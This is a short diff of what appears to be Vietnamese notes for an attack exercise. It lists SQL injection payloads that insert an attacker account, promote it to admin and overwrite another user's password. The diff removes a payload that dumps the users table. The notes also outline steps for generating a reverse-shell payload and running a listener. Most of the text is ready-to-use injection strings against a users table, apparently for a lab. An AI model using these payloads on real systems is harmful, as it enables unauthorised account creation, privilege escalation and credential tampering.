@@ -8,7 +8,6 @@
         1. tạo 1 account : ¿'; INSERT INTO users (username, password, role, email) VALUES ('hacker12', 'pwned', 'users', 'hacker12@fcode.org'); --
         2. đổi role của account = 'admin' : ¿'; UPDATE users SET role = 'admin' WHERE username = 'hacker12'; --
         3. thay đổi mật khẩu tài khoảng tuannv : ¿'; UPDATE users SET password = '123' WHERE username = 'tuannv'; --
-        4. xem database : ¿'; SELECT * FROM users; --
     - reverse shell:
         1. chạy parser.js để sinh ra mã độc
         2. bên tấn công chạy listener.js
